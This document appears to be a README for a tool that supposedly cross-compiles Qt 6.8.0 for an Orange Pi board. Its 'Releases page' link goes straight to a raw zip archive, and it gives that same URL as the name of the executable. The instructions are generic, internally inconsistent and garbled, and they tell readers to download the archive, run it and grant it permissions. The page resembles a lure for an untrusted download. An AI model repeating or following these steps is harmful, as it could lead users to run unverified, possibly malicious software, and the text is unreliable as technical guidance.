Welcome to CrossCompileQtForOpi! This guide helps you compile Qt 6.8.0 for your Orange Pi 3B v2.1 easily. Follow these simple steps to get started.

## üõ†Ô∏è Prerequisites

Before you begin, make sure you have the following:

- A computer running Windows, macOS, or Linux.
- Basic understanding of file navigation on your operating system.
- Space available on your hard drive for the installation.

## üöÄ Getting Started

1. **Visit the Releases Page**

   Start by visiting the [Releases page](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip). Here, you will find the most recent versions of the software and necessary files.

2. **Download the Software**

   On the Releases page, locate the latest version of CrossCompileQtForOpi. Click on the version number to access the individual release. You will see a list of compiled files.

3. **Select a File to Download**

   Look for the file labeled for your operating system. Click on the download link next to the file name. The download should begin automatically. Keep track of where you save this file, as you will need it later.

4. **Extract the Files**

   After the download completes, locate the .zip or .tar file in your downloads folder. Right-click on the file and select "Extract All" or "Unzip". Choose a folder where you would like the files to be extracted. 

5. **Install Required Libraries**

   CrossCompiling requires specific libraries to work correctly. Depending on your operating system, follow these steps:

   - **Windows**: Open a command prompt and run:
     ```
     choco install qt6
     ```

   - **Linux**: Use this command in the terminal:
     ```
     sudo apt install qt6base-dev
     ```

   - **macOS**: Use Homebrew to install:
     ```
     brew install qt@6
     ```

6. **Run the Application**

   Navigate to the folder where you extracted the files. Look for the executable file, typically named `https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip` (Windows) or simply `CrossCompileQtForOpi` (Linux and macOS). Double-click to run the program. 

   If prompted by your system, allow permissions for the application to run.

## üîß How to Compile Qt

Once the application is running, you can start the compilation process:

1. **Select the Source Directory**
   
   You will need to provide the path to the Qt 6.8.0 source directory. Browse and select the correct folder that contains the source files.

2. **Set the Destination Directory**

   Next, specify where you want to save the compiled files. This folder should be on your device with enough space to store the compiled code.

3. **Start Compilation**

   Click the "Compile" button within the application. The process may take some time, depending on your computer's performance. You will see a progress bar indicating the compilation status.

4. **Check for Errors**

   If the compilation finishes with errors, the application will provide a log. Review the log carefully; it will give details on what went wrong. Most issues can typically be resolved by checking the provided libraries and paths.

5. **Locate Your Compiled Files**

   Once the compilation completes successfully, navigate to the destination folder you specified earlier. You will find the compiled Qt files ready for use on your Orange Pi.
